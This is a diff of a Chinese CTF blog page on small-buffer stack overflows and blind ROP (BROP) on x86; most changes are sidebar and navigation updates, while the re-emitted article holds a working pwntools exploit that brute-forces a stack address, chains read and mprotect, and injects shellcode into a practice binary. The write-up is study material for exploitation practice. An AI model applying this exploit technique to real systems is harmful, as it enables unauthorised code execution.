@@ -17,7 +17,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://yoursite.com/images/posts/pwn/47.png">
 <meta property="og:image" content="http://yoursite.com/images/posts/pwn/48.png">
-<meta property="og:updated_time" content="2019-01-15T13:50:36.408Z">
+<meta property="og:updated_time" content="2019-01-15T14:05:24.776Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="x86下栈溢出太小和BROP">
 <meta name="twitter:description" content="前言&amp;emsp;&amp;emsp;这篇文章主要记录在x86下解决栈溢出空间太小和BROP。">
@@ -164,7 +164,7 @@
             <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这篇文章主要记录在<code>x86</code>下解决栈溢出空间太小和<code>BROP</code>。</p>
 <a id="more"></a>
 <h3 id="DEMO1"><a href="#DEMO1" class="headerlink" title="DEMO1"></a>DEMO1</h3><p>&emsp;&emsp;栈溢出可控buff太小的情况可能如下：</p>
-<div align="center"><br>    <img src="/images/posts/pwn/47.png"><br></div><br>&emsp;&emsp;可以看到<code>read(0, &amp;addr, 36u)</code>，可控大小才36个字节，只能控一次<code>ROP</code>，而在题目环境中没有<code>libc</code>，所以又要使用<code>mprotect</code>去开启权限，那一次的ROP根本满足不了我们的需求。<br><br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 36 字节理论上只能做这样的 ROP</span></span><br><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">16</span> + p32(write_addr) + p32(start_addr) + p32(<span class="hljs-number">1</span>) + temp + p32(<span class="hljs-number">0x1000</span>)</span><br></pre></td></tr></table></figure><br><br>#### 解决方案<br>&emsp;&emsp;这里使用的解决方案是<code>爆破栈地址</code>，得到栈地址（可写地址）后将我们的payload写入到栈中，然后想办法调用<code>mprotect</code>，并将<code>EIP</code>控到shellcode中来。<br><br>&emsp;&emsp;因为是<code>x86</code>，所以我们爆的栈地址并不会太多，只需要<code>\x00{0}{1}\xff</code>两个字节。运用<code>write</code>喷出一些东西，然后看看自己放置的<code>flag</code>是否在接收到的数据中，如果<code>存在</code>，那么栈地址就得到了。<br><br>#### EXP<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> colored <span class="hljs-keyword">import</span> fg, bg, attr</span><br><span class="line"><span class="hljs-keyword">from</span> cuteprint.cuteprint <span class="hljs-keyword">import</span> PrettyPrinter</span><br><span class="line">context(log_level=<span class="hljs-string">'debug'</span>, arch=<span class="hljs-string">'i386'</span>, os=<span class="hljs-string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">pr = PrettyPrinter()</span><br><span class="line"></span><br><span class="line">p = process(<span class="hljs-string">'./demo1'</span>)</span><br><span class="line">start_addr = <span class="hljs-number">0x080480B8</span></span><br><span class="line">write_addr = <span class="hljs-number">0x080480F9</span></span><br><span class="line">writable_addr = <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">(io, temp)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="hljs-string">'something'</span>)</span><br><span class="line">    offset = <span class="hljs-number">-1</span></span><br><span class="line">    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">16</span> + p32(write_addr) + p32(start_addr) + p32(<span class="hljs-number">1</span>) + temp + p32(<span class="hljs-number">0x1000</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        data = io.recv(<span class="hljs-number">0x1000</span>)</span><br><span class="line">        <span class="hljs-comment"># 判断我们的 flag 是否在数据中，如果在，那么说明我们找到了栈地址</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">'a'</span>*<span class="hljs-number">10</span> <span class="hljs-keyword">in</span> data:</span><br><span class="line">            log.debug(temp)</span><br><span class="line">            offset = data.find(<span class="hljs-string">'a'</span>*<span class="hljs-number">10</span>)</span><br><span class="line">            <span class="hljs-keyword">return</span> offset</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span></span><br><span class="line">    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">goto</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    fuzz_addr = <span class="hljs-string">"\x00&#123;0&#125;&#123;1&#125;\xff"</span></span><br><span class="line">    got = <span class="hljs-keyword">False</span></span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xbe</span>, <span class="hljs-number">256</span>):</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> got:</span><br><span class="line">            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">16</span>):</span><br><span class="line">                temp = fuzz_addr.format(chr(b), chr(a))</span><br><span class="line">                j = fuzz(p, temp)</span><br><span class="line">                <span class="hljs-keyword">if</span> j &gt; <span class="hljs-number">0</span>:</span><br><span class="line">                    got = <span class="hljs-keyword">True</span></span><br><span class="line">                    <span class="hljs-keyword">global</span> writable_addr</span><br><span class="line">                    writable_addr += u32(temp) + j</span><br><span class="line">                    pr.print_good(<span class="hljs-string">"recv offset is: "</span> + str(j))</span><br><span class="line">                    pr.print_good(<span class="hljs-string">"writable_addr is: "</span> + hex(writable_addr))</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">goto()</span><br><span class="line"></span><br><span class="line">padding = <span class="hljs-string">'a'</span> * <span class="hljs-number">16</span></span><br><span class="line">pr.print_good(<span class="hljs-string">"Step1: call read..."</span>)</span><br><span class="line">print(<span class="hljs-string">"%sStep1: call read...\n%s"</span> % (fg(<span class="hljs-number">200</span>), attr(<span class="hljs-string">'blink'</span>)))</span><br><span class="line">print(<span class="hljs-string">"%sStep1: call read...\n%s"</span> % (fg(<span class="hljs-number">200</span>),  attr(<span class="hljs-string">'underlined'</span>)))</span><br><span class="line">pause()</span><br><span class="line"><span class="hljs-comment"># 喷出 0x7d 设置 eax，调 mprotect</span></span><br><span class="line">payload = padding + p32(read_msg) + p32(start_addr) + p32(<span class="hljs-number">0</span>) + p32(writable_addr) + p32(<span class="hljs-number">0x7d</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pr.print_good(<span class="hljs-string">"Step2: ROP and send shellcode..."</span>)</span><br><span class="line">pause()</span><br><span class="line">shellcode_addr = writable_addr + <span class="hljs-number">28</span>     <span class="hljs-comment"># len(payload2) 下一行的，不包括第二行开始的</span></span><br><span class="line"><span class="hljs-comment"># 这里需要注意拼接</span></span><br><span class="line">payload2 = <span class="hljs-string">'B'</span> * <span class="hljs-number">8</span> + p32(set_ebcdx) + p32(shellcode_addr) + p32(writable_addr &amp; <span class="hljs-number">0xfffff000</span>) + p32(<span class="hljs-number">0x1000</span>) + p32(<span class="hljs-number">7</span>)  <span class="hljs-comment"># 这一行的长度</span></span><br><span class="line">payload2 += shellcode</span><br><span class="line">p.send(payload2.ljust(<span class="hljs-number">0x7d</span>, <span class="hljs-string">'\x00'</span>))</span><br></pre></td></tr></table></figure><br><br>### DEMO2<br>&emsp;&emsp;demo2是一道<code>BROP</code>，在盲pwn的情况下，我们只能靠不断的<code>fuzzing</code>来取得有价值的信息。这道题中没有开启<code>ASLR</code>，所以程序段的开始地址还是<code>0x08048000</code>，各程序段大致如下：<br><div align="center"><br>    <img src="/images/posts/pwn/48.png"><br></div>
+<div align="center"><br>    <img src="/images/posts/pwn/47.png"><br></div><br>&emsp;&emsp;可以看到<code>read(0, &amp;addr, 36u)</code>，可控大小才36个字节，只能控一次<code>ROP</code>，而在题目环境中没有<code>libc</code>，所以又要使用<code>mprotect</code>去开启权限，那一次的ROP根本满足不了我们的需求。<br><br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 36 字节理论上只能做这样的 ROP</span></span><br><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">16</span> + p32(write_addr) + p32(start_addr) + p32(<span class="hljs-number">1</span>) + temp + p32(<span class="hljs-number">0x1000</span>)</span><br></pre></td></tr></table></figure><br><br>#### 解决方案<br>&emsp;&emsp;这里使用的解决方案是<code>爆破栈地址</code>，得到栈地址（可写地址）后将我们的payload写入到栈中，然后想办法调用<code>mprotect</code>，并将<code>EIP</code>控到shellcode中来。<br><br>&emsp;&emsp;因为是<code>x86</code>，所以我们爆的栈地址并不会太多，只需要<code>\x00{0}{1}\xff</code>两个字节。运用<code>write</code>喷出一些东西，然后看看自己放置的<code>flag</code>是否在接收到的数据中，如果<code>存在</code>，那么栈地址就得到了。<br><br><br>#### EXP<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> colored <span class="hljs-keyword">import</span> fg, bg, attr</span><br><span class="line"><span class="hljs-keyword">from</span> cuteprint.cuteprint <span class="hljs-keyword">import</span> PrettyPrinter</span><br><span class="line">context(log_level=<span class="hljs-string">'debug'</span>, arch=<span class="hljs-string">'i386'</span>, os=<span class="hljs-string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">pr = PrettyPrinter()</span><br><span class="line"></span><br><span class="line">p = process(<span class="hljs-string">'./demo1'</span>)</span><br><span class="line">start_addr = <span class="hljs-number">0x080480B8</span></span><br><span class="line">write_addr = <span class="hljs-number">0x080480F9</span></span><br><span class="line">writable_addr = <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">(io, temp)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="hljs-string">'something'</span>)</span><br><span class="line">    offset = <span class="hljs-number">-1</span></span><br><span class="line">    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">16</span> + p32(write_addr) + p32(start_addr) + p32(<span class="hljs-number">1</span>) + temp + p32(<span class="hljs-number">0x1000</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        data = io.recv(<span class="hljs-number">0x1000</span>)</span><br><span class="line">        <span class="hljs-comment"># 判断我们的 flag 是否在数据中，如果在，那么说明我们找到了栈地址</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">'a'</span>*<span class="hljs-number">10</span> <span class="hljs-keyword">in</span> data:</span><br><span class="line">            log.debug(temp)</span><br><span class="line">            offset = data.find(<span class="hljs-string">'a'</span>*<span class="hljs-number">10</span>)</span><br><span class="line">            <span class="hljs-keyword">return</span> offset</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span></span><br><span class="line">    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">goto</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    fuzz_addr = <span class="hljs-string">"\x00&#123;0&#125;&#123;1&#125;\xff"</span></span><br><span class="line">    got = <span class="hljs-keyword">False</span></span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xbe</span>, <span class="hljs-number">256</span>):</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> got:</span><br><span class="line">            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">16</span>):</span><br><span class="line">                temp = fuzz_addr.format(chr(b), chr(a))</span><br><span class="line">                j = fuzz(p, temp)</span><br><span class="line">                <span class="hljs-keyword">if</span> j &gt; <span class="hljs-number">0</span>:</span><br><span class="line">                    got = <span class="hljs-keyword">True</span></span><br><span class="line">                    <span class="hljs-keyword">global</span> writable_addr</span><br><span class="line">                    writable_addr += u32(temp) + j</span><br><span class="line">                    pr.print_good(<span class="hljs-string">"recv offset is: "</span> + str(j))</span><br><span class="line">                    pr.print_good(<span class="hljs-string">"writable_addr is: "</span> + hex(writable_addr))</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">goto()</span><br><span class="line"></span><br><span class="line">padding = <span class="hljs-string">'a'</span> * <span class="hljs-number">16</span></span><br><span class="line">pr.print_good(<span class="hljs-string">"Step1: call read..."</span>)</span><br><span class="line">print(<span class="hljs-string">"%sStep1: call read...\n%s"</span> % (fg(<span class="hljs-number">200</span>), attr(<span class="hljs-string">'blink'</span>)))</span><br><span class="line">print(<span class="hljs-string">"%sStep1: call read...\n%s"</span> % (fg(<span class="hljs-number">200</span>),  attr(<span class="hljs-string">'underlined'</span>)))</span><br><span class="line">pause()</span><br><span class="line"><span class="hljs-comment"># 喷出 0x7d 设置 eax，调 mprotect</span></span><br><span class="line">payload = padding + p32(read_msg) + p32(start_addr) + p32(<span class="hljs-number">0</span>) + p32(writable_addr) + p32(<span class="hljs-number">0x7d</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pr.print_good(<span class="hljs-string">"Step2: ROP and send shellcode..."</span>)</span><br><span class="line">pause()</span><br><span class="line">shellcode_addr = writable_addr + <span class="hljs-number">28</span>     <span class="hljs-comment"># len(payload2) 下一行的，不包括第二行开始的</span></span><br><span class="line"><span class="hljs-comment"># 这里需要注意拼接</span></span><br><span class="line">payload2 = <span class="hljs-string">'B'</span> * <span class="hljs-number">8</span> + p32(set_ebcdx) + p32(shellcode_addr) + p32(writable_addr &amp; <span class="hljs-number">0xfffff000</span>) + p32(<span class="hljs-number">0x1000</span>) + p32(<span class="hljs-number">7</span>)  <span class="hljs-comment"># 这一行的长度</span></span><br><span class="line">payload2 += shellcode</span><br><span class="line">p.send(payload2.ljust(<span class="hljs-number">0x7d</span>, <span class="hljs-string">'\x00'</span>))</span><br></pre></td></tr></table></figure><br><br>### DEMO2<br>&emsp;&emsp;demo2是一道<code>BROP</code>，在盲pwn的情况下，我们只能靠不断的<code>fuzzing</code>来取得有价值的信息。这道题中没有开启<code>ASLR</code>，所以程序段的开始地址还是<code>0x08048000</code>，各程序段大致如下：<br><div align="center"><br>    <img src="/images/posts/pwn/48.png"><br></div>
 
 <p>&emsp;&emsp;可见<code>plt</code>和<code>.plt.got</code>表都在<code>.text</code>代码段的前面，所以在后面我们爆破<code>main</code>地址的时候就能猜出一些函数的<code>plt</code>地址，如<code>read</code>，它会<code>hong</code>住进程。</p>
 <p>&emsp;&emsp;在<code>x86</code>下，fuzzing的地址并不会太大，解决<code>BROP</code>可以按照如下：</p>
@@ -212,6 +212,13 @@
 
 <div class="card card-transparent">
     <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/03/ret2dl_resolve_x64/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">ret2dl_resolve x64 study</span>
+            </a>
+        </div>
         
         
         <div class="level-end">
@@ -289,7 +296,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        63
+                        64
                     </p>
                 </div>
             </div>
@@ -404,7 +411,7 @@
         <h3 class="menu-label">
             标签云
         </h3>
-        <a href="/tags/BROP/" style="font-size: 10px;">BROP</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/ret2dl-resolve/" style="font-size: 10px;">ret2dl_resolve</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
+        <a href="/tags/BROP/" style="font-size: 10px;">BROP</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/ret2dl-resolve/" style="font-size: 13.33px;">ret2dl_resolve</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
     </div>
 </div>
 
@@ -418,6 +425,25 @@
         <h3 class="menu-label">
             最新文章
         </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/03/ret2dl_resolve_x64/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve x64 study">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-03-13T16:00:00.000Z">2019-03-14</time></div>
+                    <a href="/2019/03/ret2dl_resolve_x64/" class="has-link-black-ter is-size-6">ret2dl_resolve x64 study</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -495,25 +521,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/12/pcb-writeup/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="PCB鹏程杯2018 writeup">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-02T14:05:56.000Z">2018-12-02</time></div>
-                    <a href="/2018/12/pcb-writeup/" class="has-link-black-ter is-size-6">PCB鹏程杯2018 writeup</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -525,6 +532,17 @@
             归档
         </h3>
         <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
         
         <li>
             <a class="level is-marginless" href="/archives/2019/01/">
@@ -710,7 +728,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">18</span>
+                            <span class="level-item tag">19</span>
                         </span>
                     </a>
                 </li>
@@ -831,7 +849,7 @@
                             <span class="level-item">ret2dl_resolve</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">1</span>
+                            <span class="level-item tag">2</span>
                         </span>
                     </a>
                 </li>
@@ -970,6 +988,25 @@
         
         <article class="media">
             
+            <a href="/2019/03/ret2dl_resolve_x64/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve x64 study">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-03-13T16:00:00.000Z">2019-03-14</time></div>
+                    <a href="/2019/03/ret2dl_resolve_x64/" class="has-link-black-ter is-size-6">ret2dl_resolve x64 study</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
             <a href="/2019/01/small_stack_and_brop/" class="media-left">
                 <p class="image is-64x64">
                     <img class="thumbnail" src="/images/thumbnail.svg" alt="x86下栈溢出太小和BROP">
@@ -1044,25 +1081,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/12/pcb-writeup/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="PCB鹏程杯2018 writeup">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-02T14:05:56.000Z">2018-12-02</time></div>
-                    <a href="/2018/12/pcb-writeup/" class="has-link-black-ter is-size-6">PCB鹏程杯2018 writeup</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1074,6 +1092,17 @@
             归档
         </h3>
         <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
         
         <li>
             <a class="level is-marginless" href="/archives/2019/01/">
@@ -1259,7 +1288,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">18</span>
+                            <span class="level-item tag">19</span>
                         </span>
                     </a>
                 </li>
@@ -1380,7 +1409,7 @@
                             <span class="level-item">ret2dl_resolve</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">1</span>
+                            <span class="level-item tag">2</span>
                         </span>
                     </a>
                 </li>
